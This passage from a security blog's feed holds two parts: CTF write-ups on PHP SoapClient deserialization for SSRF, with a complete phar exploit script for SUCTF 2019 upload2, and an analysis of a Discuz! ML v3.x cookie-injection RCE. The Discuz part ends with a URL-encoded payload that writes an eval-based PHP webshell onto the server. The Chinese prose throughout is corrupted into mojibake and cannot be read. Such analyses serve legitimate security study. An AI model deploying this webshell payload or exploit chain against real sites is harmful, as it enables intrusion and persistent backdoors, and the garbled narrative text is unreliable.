å­—ç¬¦ä¸²è¿›è¡Œååºåˆ—åŒ–ï¼Œå¾—åˆ°çš„å¾ˆå¯èƒ½å°±åªæ˜¯ä¸€ä¸ªæ•°ç»„ã€‚</p><p>åˆ°è¿™é‡Œï¼Œæˆ‘ä»¬çš„å¯¹è±¡æ³¨å…¥æ€»ç®—æ˜¯æˆåŠŸäº†ï¼Œé‚£è¯¥å¦‚ä½•è°ƒç”¨ <code>__call</code> å‘¢ï¼Ÿ</p><p>åˆ«å¿˜äº†è¿™è¿˜æœ‰ä¸€ä¸ª <code>reset</code> å‡½æ•°ï¼š</p><blockquote><p><strong>reset()</strong> å°† <code>array</code> çš„å†…éƒ¨æŒ‡é’ˆå€’å›åˆ°ç¬¬ä¸€ä¸ªå•å…ƒå¹¶è¿”å›ç¬¬ä¸€ä¸ªæ•°ç»„å•å…ƒçš„å€¼</p></blockquote><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œ<code>reset($_SESSION)</code> å°†è¿”å›çš„å°±æ˜¯ SoapClient å¯¹è±¡ï¼Œè¿™å°±å¾ˆæ£’äº†ï¼Œå¾—æ¥å…¨ä¸è´¹åŠŸå¤«ã€‚</p><p>æˆ‘ä»¬å¯ä»¥å…ˆæŠŠ <code>$b</code> è¦†ç›–æˆ <code>call_user_func</code> ï¼Œä»¥ä¸‹é¢è¿™ç§å½¢å¼è¿›è¡Œè°ƒç”¨ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func(<span class="keyword">array</span>(SoapClient Object, <span class="string">'welcome_to_the_lctf2018'</span>));</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5y6vceceuj20yn0h2goc.jpg" alt></p><p>å†æ­£å¸¸è®¿é—®å°±å¯ä»¥çœ‹åˆ° flag äº†ã€‚</p><h3 id="2019-SUCTF-upload2"><a href="#2019-SUCTF-upload2" class="headerlink" title="2019 SUCTF upload2"></a>2019 SUCTF upload2</h3><blockquote><p>è€ƒç‚¹ï¼šphar ååºåˆ—åŒ–ã€åå°„ã€SSRFã€SoapClient</p></blockquote><p>ç®€å•è¯´ä¸€ä¸‹é¢˜ç›®å¤§æ„ï¼Œæœ‰ä¸€ä¸ªä¸Šä¼ ç‚¹ï¼ˆindex.phpï¼‰ï¼Œé™åˆ¶äº†å›¾ç‰‡åç¼€ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"upload"</span>])) &#123;</span><br><span class="line">    <span class="comment">// å…è®¸ä¸Šä¼ çš„å›¾ç‰‡åç¼€</span></span><br><span class="line">    $allowedExts = <span class="keyword">array</span>(<span class="string">"gif"</span>, <span class="string">"jpeg"</span>, <span class="string">"jpg"</span>, <span class="string">"png"</span>);</span><br><span class="line">    $tmp_name = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">    $file_name = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">    $temp = explode(<span class="string">"."</span>, $file_name);</span><br><span class="line">    $extension = end($temp);</span><br><span class="line">    <span class="keyword">if</span> ((($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/gif"</span>)</span><br><span class="line">            || ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpeg"</span>)</span><br><span class="line">            || ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/png"</span>))</span><br><span class="line">        &amp;&amp; ($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] &lt; <span class="number">204800</span>)   <span class="comment">// å°äº 200 kb</span></span><br><span class="line">        &amp;&amp; in_array($extension, $allowedExts)</span><br><span class="line">    ) &#123;</span><br><span class="line">        $c = <span class="keyword">new</span> Check($tmp_name);</span><br><span class="line">        $c-&gt;check();</span><br><span class="line">        <span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"é”™è¯¯ï¼š: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            move_uploaded_file($tmp_name, $userdir . <span class="string">"/"</span> . md5($file_name) . <span class="string">"."</span> . $extension);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"æ–‡ä»¶å­˜å‚¨åœ¨: "</span> . $userdir . <span class="string">"/"</span> . md5($file_name) . <span class="string">"."</span> . $extension;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"éæ³•çš„æ–‡ä»¶æ ¼å¼"</span>;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>checkï¼ˆclass.phpï¼‰é‡Œæ£€æŸ¥äº†æ˜¯å¦å«æœ‰ <code>&lt;?</code>ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file_name;</span><br><span class="line">    <span class="keyword">public</span> $type;</span><br><span class="line">    <span class="keyword">public</span> $func = <span class="string">"Check"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file_name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file_name = $file_name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $class = <span class="keyword">new</span> ReflectionClass(<span class="keyword">$this</span>-&gt;func);</span><br><span class="line">        $a = $class-&gt;newInstanceArgs(<span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">        $a-&gt;check();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getMIME</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $finfo = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;type = finfo_file($finfo, <span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">        finfo_close($finfo);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;type;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Check</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file_name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file_name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file_name = $file_name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $data = file_get_contents(<span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">        <span class="keyword">if</span> (mb_strpos($data, <span class="string">"&lt;?"</span>) !== <span class="keyword">FALSE</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"&amp;lt;? in contents!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦å¤–è¿˜æœ‰ä¸€ä¸ªæŸ¥çœ‹ç‚¹ï¼ˆfunc.phpï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*/i'</span>,$_POST[<span class="string">'url'</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Go away!"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $file_path = $_POST[<span class="string">'url'</span>];</span><br><span class="line">    $file = <span class="keyword">new</span> File($file_path);</span><br><span class="line">    $file-&gt;getMIME();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Your file type is '$file' &lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›®æ ‡åœ¨ admin.php é‡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>] == <span class="string">'127.0.0.1'</span>) &#123;</span><br><span class="line">    <span class="comment">// æ‹¿ flag</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”±æ­¤å¯çŸ¥åªèƒ½æ‰“ SSRFï¼ŒåŠ ä¸Šå‰é¢çš„ä¸€ç³»åˆ—é™åˆ¶ï¼Œç›´æ¥ä¼  webshell æ˜¯ä¸å¤ªç°å®çš„ã€‚</p><p>ç»¼åˆæ€»çš„é¢˜ç›®æƒ…æ™¯ï¼Œå‰ä¸€éƒ¨åˆ†å’Œ hitcon 2017 ä¸­çš„ baby^h-master-php-2017 å¾ˆåƒï¼Œå¯ç”± <code>finfo_file($finfo, $this-&gt;file_name)</code> è§¦å‘ååºåˆ—åŒ–ï¼Œå†é€šè¿‡ soap æ‰“å‡º SSRFã€‚</p><p>ä»¥ä¸‹ç›´æ¥ç»™å‡º expï¼šï¼ˆå…·ä½“åˆ†æå¯å‚è€ƒ De1ta çš„ <a href="https://xz.aliyun.com/t/6042#toc-27" target="_blank" rel="noopener">wp</a>ï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'test.phar'</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;addFromString(<span class="string">'test.txt'</span>,<span class="string">'text'</span>);</span><br><span class="line">$phar-&gt;setStub(<span class="string">'__HALT_COMPILER();'</span>);  <span class="comment">// å¹¶ä¸éœ€è¦åŠ  <span class="meta">&lt;?</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file_name = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $func = <span class="string">"SoapClient"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $target = <span class="string">"http://127.0.0.1/admin.php"</span>;</span><br><span class="line">        $post_string = <span class="string">'admin=&amp;ip=xxx&amp;port=xx&amp;clazz=SplStack&amp;func1=push&amp;func2=push&amp;func3=push&amp;arg1=123456&amp;arg2=123456&amp;arg3='</span>. <span class="string">"\r\n"</span>;</span><br><span class="line">        $headers = [];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file_name  = [</span><br><span class="line">            <span class="keyword">null</span>,</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,</span><br><span class="line">                  <span class="string">'user_agent'</span>=&gt; str_replace(<span class="string">'^^'</span>, <span class="string">"\r\n"</span>, <span class="string">'xxxxx^^Content-Type: application/x-www-form-urlencoded^^'</span>.join(<span class="string">'^^'</span>,$headers).<span class="string">'Content-Length: '</span>. (string)strlen($post_string).<span class="string">'^^^^'</span>.$post_string),</span><br><span class="line">                  <span class="string">'uri'</span>=&gt;<span class="string">'1'</span>)</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$object = <span class="keyword">new</span> File;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($object));</span><br><span class="line">$phar-&gt;setMetadata($object);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>å¦å¤–è¿˜æœ‰ä¸€äº›ä¾‹é¢˜ï¼Œæ¯”å¦‚ï¼š</p><ul><li><p>2018 N1CTF Easy&amp;&amp;Hard PHP</p></li><li><p>2019 De1taCTF shellshellshell</p></li></ul><p>ç®€å•å°ç»“ä¸€ä¸‹ï¼Œè¿™äº›é¢˜çš„æƒ…æ™¯å¤§éƒ½æ˜¯è¿™æ ·ï¼š</p><p>æœ€ç»ˆç›®æ ‡éƒ½å—åˆ°äº† IP çš„é™åˆ¶ï¼Œå¾€å¾€éœ€è¦æ‰“å‡º SSRFï¼Œä½†å¹¶æ²¡æœ‰æ‰¾åˆ°æ˜æ˜¾çš„ SSRF ç‚¹ï¼Œåªæœ‰ä¸€ä¸ªååºåˆ—åŒ–çš„ï¼Œæ­¤æ—¶è¯¥å¦‚ä½•åˆ©ç”¨å‘¢ï¼Ÿ</p><p>éƒ½æŒ‡å‘äº†åŸç”Ÿç±»â€”â€”SOAPClientï¼Œæœ‰äº†ä¸¤ä¸ª CRLF çš„åŠ©æ”»ï¼Œæ‰“å‡ºå»çš„ POST æŠ¥æ–‡å‡ ä¹å®Œå…¨å¯æ§ã€‚</p><p>è¿™æ ·çš„ SOAPï¼Œä½ å–œæ¬¢å— ï¼šï¼‰</p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="http://pupiles.com/lctf2018.html" target="_blank" rel="noopener">http://pupiles.com/lctf2018.html</a></p><p><a href="https://blog.wonderkun.cc/2018/03/13/n1ctf-hard-php-writeup/" target="_blank" rel="noopener">https://blog.wonderkun.cc/2018/03/13/n1ctf-hard-php-writeup/</a></p><p><a href="https://www.kingkk.com/2018/11/2018-lctf-web-å­¦ä¹ ç¯‡/" target="_blank" rel="noopener">https://www.kingkk.com/2018/11/2018-lctf-web-å­¦ä¹ ç¯‡/</a></p><p><a href="https://www.anquanke.com/post/id/164569" target="_blank" rel="noopener">https://www.anquanke.com/post/id/164569</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;SOAP-ç®€ä»‹&quot;&gt;&lt;a href=&quot;#SOAP-ç®€ä»‹&quot; class=&quot;headerlink&quot; title=&quot;SOAP ç®€ä»‹&quot;&gt;&lt;/a&gt;SOAP ç®€ä»‹&lt;/h2&gt;&lt;p&gt;SOAPï¼ˆSimple Object Access Protocolï¼‰æ˜¯ä¸€ç§åœ¨ web servic
      
    
    </summary>
    
    
      <category term="ååºåˆ—åŒ–" scheme="https://wywwzjj.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
      <category term="php" scheme="https://wywwzjj.top/tags/php/"/>
    
      <category term="SSRF" scheme="https://wywwzjj.top/tags/SSRF/"/>
    
  </entry>
  
  <entry>
    <title>Discuz ML! V3.X RCE åˆ†æ</title>
    <link href="https://wywwzjj.top/2019/07/18/Discuz%20ML!%20V3.X%20RCE%20%E5%88%86%E6%9E%90/"/>
    <id>https://wywwzjj.top/2019/07/18/Discuz ML! V3.X RCE åˆ†æ/</id>
    <published>2019-07-18T15:34:37.000Z</published>
    <updated>2019-08-01T03:27:43.282Z</updated>
    
    <content type="html"><![CDATA[<h2 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><p>Discuzï¼ML æ˜¯ä¸€ä¸ªç”± CodersClub.org åˆ›å»ºçš„å¤šè¯­è¨€ï¼Œé›†æˆï¼ŒåŠŸèƒ½é½å…¨çš„å¼€æºç½‘ç»œå¹³å°ï¼Œç”¨äºæ„å»ºåƒ â€œç¤¾äº¤ç½‘ç»œâ€ è¿™æ ·çš„äº’è”ç½‘ç¤¾åŒºã€‚è¯¥å¼•æ“åŸºäº Comsenz Inc. åˆ›å»ºçš„ç€åçš„ Discuzï¼X å¼•æ“å¼€å‘ã€‚</p><p>ä½†æ˜¯ï¼Œè¿™ä¸å¸¸è§çš„ Discuz è®ºå›è¿˜æ˜¯æ²¡å¤šå¤§å…³ç³»ã€‚</p><h3 id="æ¡ä»¶"><a href="#æ¡ä»¶" class="headerlink" title="æ¡ä»¶"></a>æ¡ä»¶</h3><p>Discuz! ML v.3.4</p><p>Discuz! ML v.3.3</p><p>Discuz! ML v.3.2</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>ç®€å•æ¥è¯´ï¼Œæ²¡æœ‰ç»è¿‡ä»»ä½•å¤„ç†çš„ cookie ç›´æ¥è¢«æ‹¼æ¥è¿›æ¨¡æ¿ï¼Œè¯¥æ¨¡æ¿è¢« include åè‡ªç„¶å°±æ‰§è¡Œäº†ã€‚</p><p>ï¼ˆä¸æ„§æ˜¯å®˜æ–¹çš„ Demoï¼‰</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g58e9notqaj216u07wwfy.jpg" alt></p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>ä¸»å…¥å£æ˜¯ upload ç›®å½•ä¸‹çš„ index.phpï¼Œæ²¡æœ‰ä»»ä½•å‚æ•°çš„æƒ…å†µä¸‹ç›´æ¥è½½å…¥ forum.php</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g58ftdlnenj20kp01y3yi.jpg" alt></p><p>ç´§æ¥ç€ forum.php åˆåŠ è½½äº†ä¸¤ä¸ªæ ¸å¿ƒæ–‡ä»¶ï¼Œå¥½æˆå°±è¦å¼€å§‹äº†ã€‚</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g58gas4s7mj20ea026weg.jpg" alt></p><p>class_core.php ä¸­çš„ 39 è¡Œ <code>createapp()</code> å¼€å§‹å®ä¾‹åŒ–ä¸€ä¸ªè¶…çº§å¯¹è±¡ï¼Œå†è·Ÿä¸€ä¸‹æ„é€ å‡½æ•°</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g58gezo0iij20fn05r0t1.jpg" alt></p><p>ç¯å¢ƒå˜é‡ä¸€äº›åˆå§‹åŒ–ä»¥åŠè¾“å…¥è¾“å‡ºçš„å¤„ç†å…¨æ˜¯åœ¨è¿™é‡Œå®Œæˆçš„ï¼Œç„¦ç‚¹é”å®šåˆ° <code>_init_input()</code> </p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g58gki346wj20kz03owes.jpg" alt></p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g58gpf4h2kj20gt0200sr.jpg" alt></p><p>æ‰¾æ‰¾è¿™ä¸ªå¯æ§ç‚¹è¢«ç”¨åœ¨ä»€ä¹ˆåœ°æ–¹</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g58grpn35oj20uq0jfq50.jpg" alt></p><p>å…¶ä»–åœ°æ–¹éƒ½æ˜¯åŒ…å«ï¼Œè¿™é‡Œæœ‰ä¸ªç¼“å­˜æ–‡ä»¶ï¼Œå…ˆä¸ç®¡ï¼Œç»§ç»­è·Ÿï¼Œå‘ç°å¼€å§‹åŠ è½½ forum_index.php</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5a8i1nm7dj20ib01y3yg.jpg" alt></p><p>form_index.php çš„ 433 è¡Œå¼€å§‹åŠ è½½æ¨¡æ¿</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> template(<span class="string">'diy:forum/discuz:'</span>.$gid);</span><br></pre></td></tr></table></figure><p>ä¹‹å‰çš„é‚£ä¸ªå¯æ§ç‚¹åœ¨è¿™é‡Œå‡ºç°äº†</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5a8lkglfpj213c00wt8t.jpg" alt></p><p>ç´§æ¥ç€è¢«ä¼ å…¥äº†è¿™ä¸ªå‡½æ•°ä¹‹ä¸­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checktplrefresh($tplfile, $tplfile, @filemtime(DISCUZ_ROOT . $cachefile), $templateid, $cachefile, $tpldir, $file);</span><br></pre></td></tr></table></figure><p>ç»§ç»­è·Ÿï¼Œåœ¨ function_core.php ä¸­çš„ç¬¬ 523 è¡Œ <code>cachefile</code> è¢«ä¼ å…¥è¿›è¡Œè§£æ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$template-&gt;parse_template($maintpl, $templateid, $tpldir, $file, $cachefile);</span><br></pre></td></tr></table></figure><p>åœ¨ class_template.php ä¸­ï¼Œè¯»å–äº†ä¸€ä¸‹åŸæœ‰çš„æ¨¡æ¿</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5dm9l9v9uj20ti02ijrz.jpg" alt></p><p>æ¥ç€ç”¨æ­£åˆ™è¿›è¡Œæ›¿æ¢</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5dmbin23bj212r0alaem.jpg" alt></p><p>æœ«å°¾å°†å†™å…¥æ–‡ä»¶</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5dmmlm5z6j20i502gjrg.jpg" alt></p><p>æ¥ä¸‹æ¥åˆ°äº†æ¿€åŠ¨äººå¿ƒçš„æ—¶åˆ»ï¼Œè¿™é‡Œå°†æ‹¼æ¥æˆ‘ä»¬çš„æ¶æ„è¯­å¥è¿›å…¥æ¨¡æ¿</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5a8t4mytgj212d04fwfb.jpg" alt></p><p>ä½†æ˜¯ç¬¬ä¸€æ¬¡å¹¶ä¸ä¼šç›´æ¥æ‹¼æ¥ï¼Œå› ä¸ºè¿™æ—¶å€™çš„å­æ¨¡æ¿å¹¶æ²¡ç”Ÿæˆï¼Œè¿™é‡Œå…ˆç•™ä¸ªå°è±¡ã€‚</p><p><code>template()</code>å°†è¿”å›ä¸€ä¸ªç»å¯¹è·¯å¾„ï¼Œç„¶åè¢«åŒ…å«ï¼Œè¿™æ—¶å€™ä¼šæ‰§è¡Œä¹‹å‰ç”Ÿæˆçš„æ¨¡æ¿ï¼Œè¿™é‡Œç»§ç»­åŠ è½½æ¨¡æ¿ã€‚</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5dmgzw8lxj21ar0i20wh.jpg" alt></p><p>ç›´åˆ°è¿™ä¸€æ¬¡åŠ è½½ï¼Œæ¶æ„è¯­å¥æ‰çœŸæ­£å†™å…¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$headeradd = <span class="string">"</span></span><br><span class="line"><span class="string">0</span></span><br><span class="line"><span class="string">|| checktplrefresh('./template/default/common/header.htm', './template/default/common/header_common.htm', 1564153001, '', './data/template/en'.phpinfo().'___common_header_forum_index.tpl.php', './template/default', 'common/header_forum_index')</span></span><br><span class="line"><span class="string">|| checktplrefresh('./template/default/common/header.htm', './template/default/common/header_qmenu.htm', 1564153002, '', './data/template/en'.phpinfo().'___common_header_forum_index.tpl.php', './template/default', 'common/header_forum_index')</span></span><br><span class="line"><span class="string">|| checktplrefresh('./template/default/common/header.htm', './template/default/common/pubsearchform.htm', 1564153002, '', './data/template/en'.phpinfo().'___common_header_forum_index.tpl.php', './template/default', 'common/header_forum_index')</span></span><br><span class="line"><span class="string">;"</span></span><br></pre></td></tr></table></figure><p>å¯çœ‹åˆ°å…·ä½“çš„ä½ç½®</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5dmpsp4yej21fc04m3zq.jpg" alt></p><p>ç®€åŒ–ä¸€ä¸‹å°±æ˜¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checktplrefresh(<span class="string">'1'</span>, <span class="string">'2'</span>, <span class="number">1564153002</span>, <span class="string">''</span>, <span class="string">'3'</span>.phpinfo().<span class="string">'4'</span>, <span class="string">'5'</span>, <span class="string">'6'</span>)</span><br></pre></td></tr></table></figure><p>è‡ªç„¶ <code>phpinfo()</code> çš„å†…å®¹å°±è¢«æ‹¼æ¥åˆ°äº†æ¨¡æ¿æ–‡ä»¶ä¸­</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5dnd8cpnrj20am03mmx3.jpg" alt></p><p>æœ€åˆç”Ÿæˆçš„æ–‡ä»¶ä¸­è¿˜æœ‰åŠ è½½äº†å…¶ä»–æ¨¡æ¿ï¼Œæ¥äºŒè¿ä¸‰å°±ç”Ÿæˆäº†å¥½å‡ ä¸ªæ–‡ä»¶ï¼Œæœ€ç»ˆå½¢æˆäº†å±•ç¤ºçš„é¡µé¢ã€‚</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>ç”±äº cookie ä¸­ä¸èƒ½æœ‰å¤§å†™å­—æ¯ï¼Œå†™ webshell æ—¶è‡ªç„¶ä¸èƒ½ç›´æ¥å†™ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨ URL ç¼–ç æ¥è§£å†³ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">27.</span>file_put_contents%<span class="number">28</span>%<span class="number">27</span>confi9.php%<span class="number">27</span>%<span class="number">2</span>Curldecode%<span class="number">28</span>%<span class="number">27</span>%<span class="number">253</span>c%<span class="number">253</span>fphp+%<span class="number">2520</span><span class="keyword">eval</span>%<span class="number">28</span>%<span class="number">2524</span>_%<span class="number">2550</span>%<span class="number">254</span>f%<span class="number">2553</span>%<span class="number">2554</span>%<span class="number">255</span>b1%<span class="number">255</span>d%<span class="number">29</span>%<span class="number">253</span>b%<span class="number">253</span>f%<span class="number">253</span>e%<span class="number">27</span>%<span class="number">29</span>%<span class="number">29.</span>%<span class="number">27</span></span><br></pre></td></tr></table></figure><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æœ€åˆçš„å¯æ§å˜é‡è¢«æ‹¼æ¥åˆ°æ¨¡æ¿ä¸­ï¼Œå†åŠ ä¸Šç”Ÿæˆçš„æ¨¡æ¿è¢«åŒ…å«ï¼Œæ­¤æ—¶æ¶æ„ä»£ç å°±ç”Ÿæ•ˆäº†ï¼Œå¯¼è‡´ä»£ç æ³¨å…¥ã€‚</p>]]></content>
    
